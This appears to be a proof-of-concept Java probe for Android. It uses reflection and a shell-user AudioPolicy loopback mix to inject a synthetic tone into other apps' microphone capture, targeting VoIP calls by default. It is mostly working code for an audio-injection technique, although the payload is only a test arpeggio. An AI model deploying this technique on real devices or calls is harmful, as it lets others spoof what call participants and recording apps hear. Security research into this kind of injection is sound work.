import java.lang.reflect.*;

/**
 * MicInject — minimal no-root mic-injection probe.
 *
 * Registers a RECORDERS/loopback AudioPolicy mix (as the shell user via
 * app_process) targeting the MIC capture preset, then writes a 440 Hz tone
 * into the AudioTrack the policy hands back. Any app recording from the MIC
 * should capture the tone instead of (or mixed with) the room.
 *
 * Everything is reflection so it compiles with a plain javac + d8 — no
 * android.jar needed. All the real unknowns surface at runtime with a
 * labelled [MicInject] line, so a failure tells us exactly which step the
 * device rejected.
 */
public class MicInject {

    static void say(String s) { System.out.println("[MicInject] " + s); }

    static Method findMethod(Class<?> c, String name, Class<?>[] sig) throws Exception {
        for (Class<?> k = c; k != null; k = k.getSuperclass()) {
            try { return k.getDeclaredMethod(name, sig); } catch (NoSuchMethodException ignored) {}
        }
        throw new NoSuchMethodException(c.getName() + "." + name);
    }

    static Object call(Object target, String method, Class<?>[] sig, Object... args) throws Exception {
        boolean isStatic = target instanceof Class;
        Class<?> c = isStatic ? (Class<?>) target : target.getClass();
        Object inst = isStatic ? null : target;
        Method m = findMethod(c, method, sig);
        m.setAccessible(true);
        return m.invoke(inst, args);
    }

    static int intField(Class<?> c, String... names) {
        for (String n : names) {
            try { return c.getField(n).getInt(null); } catch (Exception ignored) {}
        }
        return -1;
    }

    public static void main(String[] args) throws Exception {
        say("start");
        // Capture preset to target. Default 7 = VOICE_COMMUNICATION (VoIP/WhatsApp calls).
        // Pass 1 to target MIC (plain voice recorder) instead.
        int preset = 7;
        if (args.length > 0) { try { preset = Integer.parseInt(args[0].trim()); } catch (Exception e) {} }
        say("target capture preset = " + preset + "  (1=MIC, 6=VOICE_RECOGNITION, 7=VOICE_COMMUNICATION)");
        // Sample rate of the injection mix. Must match the consumer or the loopback
        // connects but passes no samples (silence). VOICE_COMMUNICATION is usually
        // 16 kHz; MIC recorders usually 48 kHz. Override with the 2nd argument.
        int sr = (preset == 7) ? 16000 : 48000;
        if (args.length > 1) { try { sr = Integer.parseInt(args[1].trim()); } catch (Exception e) {} }
        say("sample rate = " + sr + " Hz");
        Class.forName("android.os.Looper").getMethod("prepareMainLooper").invoke(null);

        // --- AudioFormat: 48 kHz, PCM 16-bit, mono ---
        Class<?> cAudioFormat = Class.forName("android.media.AudioFormat");
        int ENC16 = cAudioFormat.getField("ENCODING_PCM_16BIT").getInt(null);
        int CH_MONO = cAudioFormat.getField("CHANNEL_OUT_MONO").getInt(null);
        Object afb = Class.forName("android.media.AudioFormat$Builder").getConstructor().newInstance();
        afb = call(afb, "setSampleRate", new Class[]{int.class}, sr);
        afb = call(afb, "setEncoding", new Class[]{int.class}, ENC16);
        afb = call(afb, "setChannelMask", new Class[]{int.class}, CH_MONO);
        Object format = call(afb, "build", new Class[]{});
        say("format ok");

        // --- AudioAttributes: the chosen capture preset ---
        Object aab = Class.forName("android.media.AudioAttributes$Builder").getConstructor().newInstance();
        aab = call(aab, "setCapturePreset", new Class[]{int.class}, preset);
        Object micAttr = call(aab, "build", new Class[]{});
        say("attrs ok");

        // --- AudioMixingRule: inject into recorders matching the MIC capture preset ---
        Class<?> cRule = Class.forName("android.media.audiopolicy.AudioMixingRule");
        Class<?> cRuleBuilder = Class.forName("android.media.audiopolicy.AudioMixingRule$Builder");
        int RULE_CAPTURE_PRESET = cRule.getField("RULE_MATCH_ATTRIBUTE_CAPTURE_PRESET").getInt(null);
        Object rb = cRuleBuilder.getConstructor().newInstance();
        int injectorRole = intField(cRule, "MIX_ROLE_INJECTORS", "MIX_ROLE_INJECTOR");
        if (injectorRole >= 0) {
            try { rb = call(rb, "setTargetMixRole", new Class[]{int.class}, injectorRole); say("injector role set"); }
            catch (Exception e) { say("setTargetMixRole unavailable: " + e); }
        } else {
            say("no MIX_ROLE_INJECTOR constant on this API");
        }
        rb = call(rb, "addMixRule", new Class[]{int.class, Object.class}, RULE_CAPTURE_PRESET, micAttr);
        Object rule = call(rb, "build", new Class[]{});
        say("rule ok");

        // --- AudioMix: loopback ---
        Class<?> cMix = Class.forName("android.media.audiopolicy.AudioMix");
        Class<?> cMixBuilder = Class.forName("android.media.audiopolicy.AudioMix$Builder");
        int LOOP_BACK = cMix.getField("ROUTE_FLAG_LOOP_BACK").getInt(null);
        Object mb = cMixBuilder.getConstructor(cRule).newInstance(rule);
        mb = call(mb, "setFormat", new Class[]{cAudioFormat}, format);
        mb = call(mb, "setRouteFlags", new Class[]{int.class}, LOOP_BACK);
        Object mix = call(mb, "build", new Class[]{});
        say("mix ok");

        // --- AudioPolicy (null context is fine for the static register path) ---
        Class<?> cPolicy = Class.forName("android.media.audiopolicy.AudioPolicy");
        Class<?> cPolicyBuilder = Class.forName("android.media.audiopolicy.AudioPolicy$Builder");
        Class<?> cContext = Class.forName("android.content.Context");
        Object pb = cPolicyBuilder.getConstructor(cContext).newInstance(new Object[]{null});
        pb = call(pb, "addMix", new Class[]{cMix}, mix);
        Object policy = call(pb, "build", new Class[]{});
        say("policy built");

        // --- Register as shell user ---
        Class<?> cAM = Class.forName("android.media.AudioManager");
        Object res = call(cAM, "registerAudioPolicyStatic", new Class[]{cPolicy}, policy);
        say("registerAudioPolicyStatic result=" + res + " (0 = OK)");
        if (!(res instanceof Integer) || ((Integer) res) != 0) {
            say("registration failed — stopping");
            return;
        }

        // --- Get the injection track and feed a warbling arpeggio ---
        // A steady tone can be swallowed by a call's echo/noise suppression, so
        // this cycles A-C#-E (440/554/659 Hz), 0.3 s each — obviously synthetic
        // and hard for AEC to cancel. On a call, ask the other end what they hear.
        Object track = call(policy, "createAudioTrackSource", new Class[]{cMix}, mix);
        call(track, "play", new Class[]{});
        say("INJECTING arpeggio for 90s — start your recording / be on the call NOW");

        double[] freqs = {440.0, 554.37, 659.25};
        int seg = sr * 3 / 10; // 0.3 s per note
        short[] one = new short[freqs.length * seg];
        int idx = 0;
        for (int n = 0; n < freqs.length; n++) {
            for (int i = 0; i < seg; i++) {
                one[idx++] = (short) (Math.sin(2.0 * Math.PI * freqs[n] * i / sr) * 9000);
            }
        }

        Method write = findMethod(track.getClass(), "write", new Class[]{short[].class, int.class, int.class});
        write.setAccessible(true);
        long end = System.currentTimeMillis() + 90000;
        while (System.currentTimeMillis() < end) write.invoke(track, one, 0, one.length);

        call(track, "stop", new Class[]{});
        call(track, "release", new Class[]{});
        try { call(cAM, "unregisterAudioPolicyAsyncStatic", new Class[]{cPolicy}, policy); } catch (Exception ignored) {}
        say("done");
    }
}
